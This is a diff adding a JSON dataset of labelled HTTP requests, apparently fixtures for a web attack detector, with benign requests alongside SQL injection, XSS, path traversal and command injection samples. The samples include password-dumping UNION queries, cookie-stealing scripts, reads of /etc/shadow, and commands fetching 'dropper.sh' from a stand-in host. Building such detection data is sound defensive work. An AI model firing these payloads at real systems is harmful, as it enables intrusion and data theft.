@@ -1,0 +1,399 @@
+[
+  {
+    "id": "b1",
+    "label": "benign",
+    "method": "GET",
+    "url": "/products?category=laptops&sort=price",
+    "headers": { "user-agent": "Mozilla/5.0", "accept": "text/html" },
+    "body": "",
+    "description": "Normal product listing request"
+  },
+  {
+    "id": "b2",
+    "label": "benign",
+    "method": "GET",
+    "url": "/search?q=wireless+mouse",
+    "headers": { "user-agent": "Mozilla/5.0", "accept": "application/json" },
+    "body": "",
+    "description": "Normal search request"
+  },
+  {
+    "id": "b3",
+    "label": "benign",
+    "method": "POST",
+    "url": "/login",
+    "headers": { "content-type": "application/json", "user-agent": "Mozilla/5.0" },
+    "body": "{\"username\":\"student1\",\"password\":\"SecurePass!23\"}",
+    "description": "Normal login payload"
+  },
+  {
+    "id": "b4",
+    "label": "benign",
+    "method": "POST",
+    "url": "/comments",
+    "headers": { "content-type": "application/json" },
+    "body": "{\"postId\":15,\"comment\":\"Great explanation, thank you for sharing.\"}",
+    "description": "Normal comment submission"
+  },
+  {
+    "id": "b5",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/profile?id=2481",
+    "headers": { "accept": "application/json", "authorization": "Bearer sample-token" },
+    "body": "",
+    "description": "Profile lookup"
+  },
+  {
+    "id": "b6",
+    "label": "benign",
+    "method": "GET",
+    "url": "/docs/getting-started",
+    "headers": { "user-agent": "Mozilla/5.0", "accept-language": "en-US" },
+    "body": "",
+    "description": "Documentation page request"
+  },
+  {
+    "id": "b7",
+    "label": "benign",
+    "method": "POST",
+    "url": "/cart/update",
+    "headers": { "content-type": "application/json" },
+    "body": "{\"itemId\":24,\"quantity\":2}",
+    "description": "Shopping cart update"
+  },
+  {
+    "id": "b8",
+    "label": "benign",
+    "method": "GET",
+    "url": "/images/logo.png",
+    "headers": { "accept": "image/png" },
+    "body": "",
+    "description": "Static asset request"
+  },
+  {
+    "id": "b9",
+    "label": "benign",
+    "method": "POST",
+    "url": "/api/contact",
+    "headers": { "content-type": "application/x-www-form-urlencoded" },
+    "body": "name=Sara+Ali&email=sara%40mail.com&message=I+need+help+with+my+order",
+    "description": "Contact form request"
+  },
+  {
+    "id": "b10",
+    "label": "benign",
+    "method": "GET",
+    "url": "/reports?month=2026-02&department=cs",
+    "headers": { "accept": "application/json" },
+    "body": "",
+    "description": "Filtered report query"
+  },
+  {
+    "id": "b11",
+    "label": "benign",
+    "method": "POST",
+    "url": "/api/feedback",
+    "headers": { "content-type": "application/json" },
+    "body": "{\"rating\":5,\"message\":\"The portal is fast and easy to use.\"}",
+    "description": "Feedback payload"
+  },
+  {
+    "id": "b12",
+    "label": "benign",
+    "method": "GET",
+    "url": "/download?file=course-outline.pdf",
+    "headers": { "accept": "application/pdf" },
+    "body": "",
+    "description": "Normal file download"
+  },
+  {
+    "id": "s1",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/login?username=admin'--&password=x",
+    "headers": { "user-agent": "sqlmap/1.0" },
+    "body": "",
+    "description": "Classic SQL comment bypass attempt"
+  },
+  {
+    "id": "s2",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/products?id=10%20OR%201=1",
+    "headers": { "accept": "*/*" },
+    "body": "",
+    "description": "Boolean SQL injection in query"
+  },
+  {
+    "id": "s3",
+    "label": "sql_injection",
+    "method": "POST",
+    "url": "/login",
+    "headers": { "content-type": "application/x-www-form-urlencoded" },
+    "body": "username=admin' OR '1'='1&password=test",
+    "description": "Tautology in login form"
+  },
+  {
+    "id": "s4",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/search?q=' UNION SELECT username,password FROM users--",
+    "headers": { "user-agent": "Mozilla/5.0" },
+    "body": "",
+    "description": "Union-select payload"
+  },
+  {
+    "id": "s5",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/orders?sort=price;DROP TABLE users",
+    "headers": { "accept": "text/html" },
+    "body": "",
+    "description": "Statement chaining and drop table"
+  },
+  {
+    "id": "s6",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/api/items?id=7%20AND%20SLEEP(5)",
+    "headers": { "accept": "application/json" },
+    "body": "",
+    "description": "Time-based SQL injection"
+  },
+  {
+    "id": "s7",
+    "label": "sql_injection",
+    "method": "POST",
+    "url": "/api/filter",
+    "headers": { "content-type": "application/json" },
+    "body": "{\"field\":\"name\",\"value\":\"' UNION SELECT table_name FROM information_schema.tables--\"}",
+    "description": "Schema enumeration payload"
+  },
+  {
+    "id": "s8",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/profile?id=1%27%20OR%20%271%27=%271",
+    "headers": { "accept": "text/html" },
+    "body": "",
+    "description": "Encoded SQL injection tautology"
+  },
+  {
+    "id": "x1",
+    "label": "xss",
+    "method": "GET",
+    "url": "/search?q=<script>alert(1)</script>",
+    "headers": { "user-agent": "Mozilla/5.0" },
+    "body": "",
+    "description": "Reflected XSS script tag"
+  },
+  {
+    "id": "x2",
+    "label": "xss",
+    "method": "GET",
+    "url": "/comments?text=%3Cimg%20src=x%20onerror=alert(1)%3E",
+    "headers": { "accept": "text/html" },
+    "body": "",
+    "description": "Encoded XSS event handler"
+  },
+  {
+    "id": "x3",
+    "label": "xss",
+    "method": "POST",
+    "url": "/feedback",
+    "headers": { "content-type": "application/json" },
+    "body": "{\"message\":\"<svg onload=alert(1)>\"}",
+    "description": "Stored XSS style payload"
+  },
+  {
+    "id": "x4",
+    "label": "xss",
+    "method": "GET",
+    "url": "/redirect?next=javascript:alert(document.cookie)",
+    "headers": { "accept": "text/html" },
+    "body": "",
+    "description": "Javascript URI payload"
+  },
+  {
+    "id": "x5",
+    "label": "xss",
+    "method": "POST",
+    "url": "/profile/update",
+    "headers": { "content-type": "application/x-www-form-urlencoded" },
+    "body": "displayName=%3Cscript%3Efetch('/steal')%3C%2Fscript%3E",
+    "description": "Encoded script injection"
+  },
+  {
+    "id": "x6",
+    "label": "xss",
+    "method": "GET",
+    "url": "/search?q=%22%3E%3Cscript%3Ealert('xss')%3C/script%3E",
+    "headers": { "user-agent": "Mozilla/5.0" },
+    "body": "",
+    "description": "Attribute-breaking reflected XSS"
+  },
+  {
+    "id": "x7",
+    "label": "xss",
+    "method": "GET",
+    "url": "/notes?title=<body onload=alert(1)>",
+    "headers": { "accept": "text/html" },
+    "body": "",
+    "description": "Body onload event payload"
+  },
+  {
+    "id": "x8",
+    "label": "xss",
+    "method": "POST",
+    "url": "/api/messages",
+    "headers": { "content-type": "application/json" },
+    "body": "{\"text\":\"<iframe src=javascript:alert(1)></iframe>\"}",
+    "description": "Iframe javascript payload"
+  },
+  {
+    "id": "p1",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/download?file=../../etc/passwd",
+    "headers": { "accept": "*/*" },
+    "body": "",
+    "description": "Unix path traversal"
+  },
+  {
+    "id": "p2",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/files?name=..\\..\\Windows\\win.ini",
+    "headers": { "accept": "*/*" },
+    "body": "",
+    "description": "Windows traversal attempt"
+  },
+  {
+    "id": "p3",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/export?template=%2e%2e%2f%2e%2e%2fetc%2fshadow",
+    "headers": { "accept": "application/json" },
+    "body": "",
+    "description": "Encoded traversal attack"
+  },
+  {
+    "id": "p4",
+    "label": "path_traversal",
+    "method": "POST",
+    "url": "/api/render",
+    "headers": { "content-type": "application/json" },
+    "body": "{\"template\":\"../../../../var/log/auth.log\"}",
+    "description": "Traversal in JSON field"
+  },
+  {
+    "id": "p5",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/assets?path=../../../boot.ini",
+    "headers": { "accept": "text/plain" },
+    "body": "",
+    "description": "Traversal to system file"
+  },
+  {
+    "id": "p6",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/preview?doc=%252e%252e%252f%252e%252e%252fsecret.txt",
+    "headers": { "accept": "*/*" },
+    "body": "",
+    "description": "Double-encoded traversal"
+  },
+  {
+    "id": "p7",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/templates/main?name=../../app/config.yml",
+    "headers": { "accept": "text/html" },
+    "body": "",
+    "description": "Application config file traversal"
+  },
+  {
+    "id": "p8",
+    "label": "path_traversal",
+    "method": "POST",
+    "url": "/api/file",
+    "headers": { "content-type": "application/x-www-form-urlencoded" },
+    "body": "path=..%2F..%2F..%2Fetc%2Fpasswd",
+    "description": "Traversal through form data"
+  },
+  {
+    "id": "c1",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/tools/ping?host=8.8.8.8;cat /etc/passwd",
+    "headers": { "accept": "text/html" },
+    "body": "",
+    "description": "Command separator with cat"
+  },
+  {
+    "id": "c2",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/diagnostics?target=127.0.0.1&&whoami",
+    "headers": { "accept": "application/json" },
+    "body": "",
+    "description": "And-separator with whoami"
+  },
+  {
+    "id": "c3",
+    "label": "command_injection",
+    "method": "POST",
+    "url": "/api/tools/run",
+    "headers": { "content-type": "application/json" },
+    "body": "{\"host\":\"example.com | powershell -enc AAAA\"}",
+    "description": "Pipe with powershell payload"
+  },
+  {
+    "id": "c4",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/status?cmd=ls%20-la",
+    "headers": { "accept": "text/plain" },
+    "body": "",
+    "description": "Direct command request"
+  },
+  {
+    "id": "c5",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/network/ping?ip=1.1.1.1%20%26%26%20curl%20http://evil.test/p.sh",
+    "headers": { "accept": "text/html" },
+    "body": "",
+    "description": "Command chaining with curl"
+  },
+  {
+    "id": "c6",
+    "label": "command_injection",
+    "method": "POST",
+    "url": "/ops/shell",
+    "headers": { "content-type": "application/x-www-form-urlencoded" },
+    "body": "input=test;uname -a",
+    "description": "Form payload with uname"
+  },
+  {
+    "id": "c7",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/report?name=`whoami`",
+    "headers": { "accept": "application/json" },
+    "body": "",
+    "description": "Backtick command substitution"
+  },
+  {
+    "id": "c8",
+    "label": "command_injection",
+    "method": "POST",
+    "url": "/api/scan",
+    "headers": { "content-type": "application/json" },
+    "body": "{\"target\":\"8.8.8.8; wget http://evil.test/dropper.sh\"}",
+    "description": "Download command injection"
+  }
+]
+
